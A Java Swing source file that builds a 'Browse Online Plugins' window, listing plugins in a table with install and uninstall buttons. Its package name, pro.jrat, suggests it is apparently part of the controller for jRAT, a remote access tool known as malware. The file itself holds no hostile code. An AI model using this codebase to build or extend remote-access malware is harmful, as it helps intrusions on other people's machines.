package pro.jrat.ui.frames;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;

import pro.jrat.ErrorDialog;
import pro.jrat.extensions.OnlinePlugin;

@SuppressWarnings("serial")
public class FrameOnlinePlugins extends JFrame {

	private ActionListener listener = new ActionListener() {
		@Override
		public void actionPerformed(ActionEvent e) {

		}
	};
	private JPanel contentPane;
	private JTable table;
	private DefaultTableModel model;
	private JPopupMenu popupMenu;
	private JMenuItem mntmReload;
	private List<OnlinePlugin> plugins;

	public FrameOnlinePlugins() {
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameOnlinePlugins.class.getResource("/icons/application_icon_large.png")));
		setTitle("Browse Online Plugins");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 725, 418);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		contentPane.add(scrollPane, BorderLayout.CENTER);

		table = new JTable() {
			public Class<?> getColumnClass(int column) {
				if (column == 5) {
					return JButton.class;
				} else {
					return super.getColumnClass(column);
				}
			}
		};
		model = new DefaultTableModel(new Object[][] {}, new String[] { "Name", "Author", "Description", "Version", "Built for", "Toggle" }) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		};
		table.setDefaultRenderer(Object.class, new DefaultTableCellRenderer() {
			public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
				JLabel lbl = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);

				OnlinePlugin plugin = getPlugin((String) table.getValueAt(row, 0));

				if (column == 0 && plugin != null) {
					lbl.setIcon(plugin.getIcon());
				} else if (column == 5) {
					if (plugin == null) {
						JButton btn = new JButton("?");
						btn.setEnabled(false);
						return btn;
					} else {
						File pluginFile = new File("plugins/" + plugin.getName() + ".jar");

						JButton btn = new JButton(pluginFile.exists() ? "Uninstall" : "Install");
						btn.addActionListener(listener);
						return btn;
					}
				} else {
					lbl.setIcon(null);
				}

				return lbl;
			}
		});

		table.setModel(model);
		table.getColumnModel().getColumn(0).setPreferredWidth(144);
		table.getColumnModel().getColumn(1).setPreferredWidth(93);
		table.getColumnModel().getColumn(2).setPreferredWidth(124);
		table.setRowHeight(25);

		popupMenu = new JPopupMenu();
		addPopup(scrollPane, popupMenu);
		addPopup(table, popupMenu);

		mntmReload = new JMenuItem("Reload");
		popupMenu.add(mntmReload);
		scrollPane.setViewportView(table);

		reload();
	}

	public void reload() {
		try {
			while (model.getRowCount() > 0) {
				model.removeRow(0);
			}

			plugins = OnlinePlugin.getAvailablePlugins();

			for (OnlinePlugin plugin : plugins) {
				model.addRow(new Object[] { plugin.getName(), plugin.getAuthor(), plugin.getDescription(), plugin.getVersion(), plugin.getBuiltFor() });
			}
		} catch (Exception e) {
			e.printStackTrace();
			ErrorDialog.create(e);
		}
	}

	public OnlinePlugin getPlugin(String name) {
		for (OnlinePlugin plugin : plugins) {
			if (plugin.getName().trim().equals(name.trim())) {
				return plugin;
			}
		}

		return null;
	}

	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
